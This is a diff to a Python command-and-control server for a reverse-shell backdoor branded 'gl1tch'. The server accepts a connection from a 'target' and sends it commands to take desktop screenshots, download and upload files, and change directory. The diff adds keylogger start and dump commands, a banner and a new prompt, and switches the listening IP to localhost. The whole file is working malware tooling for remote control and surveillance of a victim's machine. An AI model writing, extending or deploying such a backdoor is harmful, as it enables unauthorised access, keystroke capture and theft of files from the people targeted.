@@ -2,9 +2,10 @@ import socket
 import json
 import termcolor
 import os
+from art import *
 
 
-HOST_IP = '10.10.10.103' 
+HOST_IP = '127.0.0.1' 
 PORT = 5555
 def cmd_send(data):
     jsondata = json.dumps(data)
@@ -40,7 +41,7 @@ def upload_file(file_name):
 
 def target_communication():
     while True:
-        command = input(termcolor.colored('#> ', 'blue'))
+        command = input(termcolor.colored('#gl1tch> ', 'blue'))
         cmd_send(command)
 
         if command == ':kill':
@@ -51,12 +52,14 @@ def target_communication():
 
         elif command == 'help':
             print(termcolor.colored('''   
-                :kill                 ->  exit from shell
-                screenshot            ->  takes screenshot of target desktop
-                download <filename>   ->  recieve file from target
-                upload <filename>     ->  send file to target
-                clear                 ->  clear the shell
-                cd                    ->  change directory
+                            :kill                 ->  exit from shell
+                            screenshot            ->  takes screenshot of target desktop
+                            download <filename>   ->  recieve file from target
+                            upload <filename>     ->  send file to target
+                            clear                 ->  clear the shell
+                            cd                    ->  change directory
+                            keylog start          ->  start keylogger
+                            keylog dump           ->  dump keylogger
             ''', 'yellow'))
 
         elif command == 'clear':
@@ -86,4 +89,18 @@ server.listen(5)
 target, ip = server.accept()
 print(termcolor.colored('[+] Target connected from ' + str(ip), 'green'))
 print('\n')
+
+ascii_art = text2art("gl1tch", "random")
+print(ascii_art)
+print(termcolor.colored('''   
+                    :kill                 ->  exit from shell
+                    screenshot            ->  takes screenshot of target desktop
+                    download <filename>   ->  recieve file from target
+                    upload <filename>     ->  send file to target
+                    clear                 ->  clear the shell
+                    cd                    ->  change directory
+                    keylog start          ->  start keylogger
+                    keylog dump           ->  dump keylogger
+            ''', 'yellow'))
+
 target_communication()
